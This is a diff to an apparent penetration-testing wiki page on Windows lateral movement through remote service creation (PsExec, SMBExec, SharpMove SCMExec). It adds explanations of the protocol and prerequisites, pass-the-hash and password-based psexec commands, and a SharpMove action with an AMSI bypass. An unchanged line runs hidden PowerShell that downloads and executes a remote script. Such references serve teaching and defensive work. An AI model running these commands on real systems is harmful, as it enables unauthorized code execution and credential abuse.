@@ -1,12 +1,12 @@
-# PsExec/Winexec/ScExec/SMBExec
+# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## How do they work
 
-These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The common flow is:
+These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The Service Control Manager Remote Protocol (SCMR) is the RPC-based interface for configuring and controlling Windows services on a remote computer. With sufficient permissions, an operator can create or reconfigure a service whose binary path contains a command and then start that service to execute it remotely.<sup>[[5]](#references)</sup> The common flow is:
 
-1. Authenticate to the target and access the ADMIN$ share over SMB (TCP/445).
+1. Authenticate to the target over SMB/RPC (TCP/445); access the ADMIN$ share when the chosen variant needs to stage a file or retrieve output there.
 2. Copy an executable or specify a LOLBAS command line that the service will run.
 3. Create a service remotely via SCM (MS-SCMR over \PIPE\svcctl) pointing to that command or binary.
 4. Start the service to execute the payload and optionally capture stdin/stdout via a named pipe.
@@ -14,9 +14,11 @@ These techniques abuse the Windows Service Control Manager (SCM) remotely over S
 
 Requirements/prereqs:
 - Local Administrator on the target (SeCreateServicePrivilege) or explicit service creation rights on the target.
-- SMB (445) reachable and ADMIN$ share available; Remote Service Management allowed through host firewall.
+- SMB (445) reachable and Remote Service Management allowed through the host firewall; ADMIN$ must be available for variants that use it to stage a file or retrieve output.
 - UAC Remote Restrictions: with local accounts, token filtering may block admin over the network unless using the built-in Administrator or LocalAccountTokenFilterPolicy=1.
 - Kerberos vs NTLM: using a hostname/FQDN enables Kerberos; connecting by IP often falls back to NTLM (and may be blocked in hardened environments).
+
+If no service account is specified, `CreateService` uses `LocalSystem`, which has extensive local privileges. This explains the high impact of successful SCM execution. It does not inherently disable UAC or Microsoft Defender: the caller still needs remote SCM rights, and endpoint controls can inspect or block the service or payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
 
 ### Manual ScExec/WinExec via sc.exe
 
@@ -86,6 +88,16 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 
+On Kali, the Impacket examples may be located under `/usr/share/doc/python3-impacket/examples/`. If no password is provided, the tool prompts for one. Impacket's `-k` requests Kerberos authentication instead of NTLM, usually using the current credential cache or supplied credentials.
+
+```bash
+#If no password is provided, it will be prompted
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+psexec \\192.168.122.66 -u Administrator -p 123456Ww
+psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
+```
+
 Artifacts
 - Temporary EXE in C:\Windows\ (random 8 chars). Service name defaults to RemComSvc unless overridden.
 
@@ -106,7 +118,7 @@ smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
 
-- [SharpMove](https://github.com/0xthirteen/SharpMove) includes service modification/creation to execute a command remotely.
+- [SharpMove](https://github.com/0xthirteen/SharpMove) supports authenticated remote execution through SCM and several other Windows mechanisms, including service modification/creation.
 
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
@@ -118,6 +130,14 @@ SharpMove.exe action=startservice computername=remote.host.local servicename=Tes
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
+```
+
+#### SCMExec with SharpMove
+
+The SCM action creates a service named `WindowsDebug` and points it at a payload already present on the remote host.<sup>[[6]](#references)</sup>
+
+```powershell
+SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
 ```
 
 ## OPSEC, detection and artifacts
@@ -165,5 +185,9 @@ Hunting ideas
 - [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
 - [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 - [4] [Microsoft – Troubleshoot unexpected reboots using system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
+- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
+- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
+- [7] [Microsoft Learn - LocalSystem account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
+- [8] [Microsoft Learn - `CreateService` function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 
 {{#include ../../banners/hacktricks-training.md}}
